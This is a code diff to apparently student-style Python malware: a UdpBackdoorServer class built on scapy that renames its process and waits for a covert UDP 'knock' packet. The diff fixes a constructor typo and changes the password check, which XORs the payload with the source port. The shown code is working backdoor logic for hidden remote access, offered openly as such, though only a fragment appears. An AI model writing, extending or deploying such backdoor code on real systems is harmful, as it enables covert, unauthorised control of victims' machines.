@@ -3,6 +3,7 @@ from scapy.all import *
 from setproctitle import setproctitle, getproctitle
 from threading import Thread
 
+import binascii
 import command
 import Crypto.Cipher
 import Queue
@@ -321,19 +322,18 @@ class UdpBackdoorServer(BackdoorServer):
         Positional arguments:
         listenport - The port on which the backdoor server will listen for clients.
         """
-        super(UdpBackdoorServer, self).__init__(procname, aeskey, password, clienport)
+        super(UdpBackdoorServer, self).__init__(procname, aeskey, password, clientport)
         self.lport = listenport
 
     def listen(self):
-        # Create a new random source port from which to send
-        self.sport = RandShort()
-        print("entered the UDP Listen")
+        
         # If payload xor ((packet["UDP"].sport << 48) + (packet["UDP"].sport << 32) + (packet["UDP"].sport << 16) + (packet["UDP"].sport)) == pw, we have a client
         def is_auth(packet):
-            if len(packet["UDP"].payload) != 8:
-                return False
 
-            int_payload = struct.unpack("<Q", packet["UDP"].payload)[0]
+            if len(packet["UDP"].payload) != 18: #SCAPY BUG - PADDING 10 0s to the end
+                return False
+            temp_payload = bytes(packet["UDP"].payload)[:8]
+            int_payload = struct.unpack("<Q", temp_payload)[0]
             xor_mask = (packet["UDP"].sport << 48) + (packet["UDP"].sport << 32) + (packet["UDP"].sport << 16) + (packet["UDP"].sport)
             pw = struct.pack("<Q", int_payload ^ xor_mask)
 
@@ -344,7 +344,7 @@ class UdpBackdoorServer(BackdoorServer):
                 return False
 
         bpf_filter = "udp dst port {}".format(self.lport)
-        sniff(filter=bpf_filter, stop_filter=is_auth)
+        sniff(filter=bpf_filter, stop_filter=is_auth) #THIS SHOULDN"T BE SO STUPID
 
     def recv(self):
         bpf_filter = "src host {} and udp dst port {}".format(self.client, self.lport)
